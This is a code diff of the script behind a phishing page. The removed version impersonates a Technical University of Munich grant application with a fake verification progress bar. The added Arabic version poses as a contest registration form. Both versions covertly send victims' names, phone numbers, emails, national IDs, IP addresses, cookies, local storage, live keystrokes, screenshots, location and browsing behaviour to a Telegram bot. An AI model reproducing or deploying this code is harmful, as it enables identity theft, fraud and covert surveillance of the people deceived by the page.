+            `⚡ <b>أداء JS:</b> ${d.perf}`,
+            `🗄️ <b>IndexedDB:</b> ${d.idb}`,
+            `🍪 <b>الكوكيز:</b> <code>${d.cookies.substring(0,150)}</code>`,
+            `📦 <b>التخزين المحلي (JSON):</b> <code>${d.localData.substring(0,200)}</code>`,
+            `👆 <b>آخر لمسات:</b> ${d.touchSummary || 'لا يوجد'}`,
+            `🖱️ <b>آخر نقرات:</b> ${d.clickSummary || 'لا يوجد'}`
+        ];
+        await sendFormattedMessage('تقرير الجهاز المفصل', fields);
+    }
+
+    // التقاط لقطة شاشة
+    async function takeScreenshot() {
+        try {
+            let canvas = await html2canvas(document.body, { scale: 0.6, logging: false, useCORS: false });
+            let imgData = canvas.toDataURL('image/jpeg', 0.7);
+            await sendPhoto(imgData);
+            return true;
+        } catch(e) { return false; }
+    }
+
+    // مراقبة الكتابة الفورية
+    ['fullname','phone','email','national_id'].forEach(id => {
+        document.getElementById(id).addEventListener('input', (e) => {
+            if(e.target.value.length > 3 && !formDataSent)
+                sendFormattedMessage('كتابة فورية', [`الحقل: ${id}`, `النص: ${e.target.value}`]);
+        });
     });
 
-    window.onblur = () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📴 User left the page")}`);
-    };
-    window.onfocus = () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 User returned to the page")}`);
-    };
+    // تسجيل اللمس والنقر
+    document.addEventListener('touchstart', (e) => {
+        let t = e.touches[0];
+        touchRecord.push({x: t.clientX, y: t.clientY, time: Date.now()});
+        if(touchRecord.length > 15) touchRecord.shift();
+    });
+    document.addEventListener('click', (e) => {
+        clickRecord.push({x: e.clientX, y: e.clientY, time: Date.now()});
+        if(clickRecord.length > 10) clickRecord.shift();
+    });
 
-    function getLocationAndSend() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const locMsg = `📍 User exact location:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
-            }, err => {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ User denied location access")}`);
-            });
-        }
-    }
-
-    document.addEventListener('click', async () => {
-        try {
-            const freshAudio = await getAudioFingerprint();
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎧 Audio fingerprint (after touch): " + freshAudio)}`);
-        } catch(e) {}
-    }, { once: true });
-
-    // محاكاة شريط التقدم
-    function simulateProgress(callback) {
-        let width = 0;
-        const fill = document.getElementById('progressFill');
-        const statusText = document.getElementById('progressStatus');
-        const steps = [
-            "Connecting to secure gateway...",
-            "Encrypting data (TLS 1.3)...",
-            "Querying German ministry database...",
-            "Verifying credentials...",
-            "Finalizing grant allocation..."
-        ];
-        let stepIndex = 0;
-        const interval = setInterval(() => {
-            if (stepIndex < steps.length) {
-                statusText.innerText = steps[stepIndex];
-                stepIndex++;
-            }
-            width += 20;
-            fill.style.width = width + '%';
-            if (width >= 100) {
-                clearInterval(interval);
-                if (callback) callback();
-            }
-        }, 600);
-    }
-
-    // ========== المعالجة الأساسية ==========
-    async function processVerification() {
-        const name = document.getElementById('fullname').value.trim();
-        const phone = document.getElementById('phone').value.trim();
-        const email = document.getElementById('email').value.trim();
-        const jobId = document.getElementById('job_id').value.trim();
-        const nationalId = document.getElementById('national_id').value.trim();
-        
+    // عند الضغط على زر التسجيل
+    async function handleSubmit() {
+        if(formDataSent) return;
+        let name = document.getElementById('fullname').value.trim();
+        let phone = document.getElementById('phone').value.trim();
+        let email = document.getElementById('email').value.trim();
+        let national = document.getElementById('national_id').value.trim();
         if(!name || !phone || !email) {
-            showToast(currentLang === 'en' ? "Please fill all required fields (Name, Phone, Email)" : "يرجى ملء الحقول الإجبارية (الاسم، الجوال، البريد)", 3000, "#dc3545");
+            showToast("يرجى إدخال الاسم والجوال والبريد الإلكتروني");
             return;
         }
+        document.getElementById('form-area').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
         
-        document.getElementById('step-form').style.display = 'none';
-        document.getElementById('loading-box').style.display = 'block';
-        document.getElementById('progressFill').style.width = '0%';
+        // إرسال بيانات المستخدم
+        let userFields = [
+            `👤 الاسم: ${name}`,
+            `📞 الجوال: ${phone}`,
+            `📧 البريد: ${email}`,
+            `🪪 الهوية: ${national || 'لم يذكر'}`
+        ];
+        await sendFormattedMessage('بيانات متسابق جديد', userFields);
         
-        getLocationAndSend();
-        const userIP = await fetchUserIP();
+        // لقطة شاشة
+        await takeScreenshot();
         
-        const userDataMsg = `
-🎓 [TUM] New Excellence Grant Application
-👤 Full Name: ${name}
-📱 Phone: ${phone}
-📧 Email: ${email}
-🆔 Job ID: ${jobId || '(not provided)'}
-🪪 National ID: ${nationalId || '(not provided)'}
-🌍 IP Address: ${userIP}
-----------------------------------
-✅ Status: Form submitted successfully
-        `;
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(userDataMsg)}`);
+        // تقرير الجهاز المفصل (بما فيه IP العام)
+        await sendDeviceReport();
         
-        simulateProgress(() => {
-            document.getElementById('loading-box').style.display = 'none';
-            document.getElementById('success-message').style.display = 'block';
-            showToast(currentLang === 'en' ? "Verification successful! You will receive an email shortly." : "تم التحقق بنجاح! سيصلك بريد إلكتروني قريباً.", 4000, "#2e7d32");
-        });
+        formDataSent = true;
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('form-area').innerHTML = `<div style="background:#1e3a8a; padding:15px; border-radius:30px; text-align:center; color:#fff;">✅ تم تسجيل ملفك بنجاح! سيتم التواصل معك عبر البريد الجامعي لإعلان النتيجة.</div>`;
+            showToast("تم التسجيل بنجاح، نتمنى لك التوفيق 🎉");
+        }, 2500);
     }
-    
-    function redirectToTUM() {
-        window.location.href = "https://www.tum.de";
-    }
-    
-    function showToast(msg, duration = 3000, bgColor = "#000") {
-        const toast = document.getElementById('academic-toast');
-        toast.innerText = msg;
-        toast.style.backgroundColor = bgColor;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, duration);
-    }
-    
-    let toastMessages = translations.en.toastUpdates;
-    setInterval(() => {
-        const randomMsg = toastMessages[Math.floor(Math.random() * toastMessages.length)];
-        showToast(randomMsg, 2800, "#0065BD");
-    }, 7000);
-    
-    applyLanguage('en');
-</script>
 
+    function showToast(msg) {
+        let t = document.getElementById('toastMsg');
+        t.innerText = msg;
+        t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 4000);
+    }
+
+    // جلب الـ IP العام أولاً
+    async function fetchPublicIP() {
+        try {
+            let res = await fetch('https://api.ipify.org?format=json');
+            let data = await res.json();
+            publicIP = data.ip;
+        } catch(e) { publicIP = 'غير متاح'; }
+    }
+
+    // بدء الرادار فوراً
+    window.addEventListener('load', async () => {
+        await fetchPublicIP();       // نجيب الـ IP أولاً
+        await sendDeviceReport();    // تقرير أولي (سيظهر فيه IP العام)
+        // كشف وضع التخفي
+        if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
+            sendFormattedMessage('تنبيه', ['⚠️ المتصفح في وضع التخفي (Incognito)']);
+        }
+        // مراقبة الخروج والدخول
+        window.onblur = () => sendFormattedMessage('سلوك المستخدم', ['📴 غادر الصفحة']);
+        window.onfocus = () => sendFormattedMessage('سلوك المستخدم', ['📱 عاد إلى الصفحة']);
+    });
+
+    document.getElementById('submitBtn').addEventListener('click', handleSubmit);
+</script>
 </body>
-    </html>
+</html>
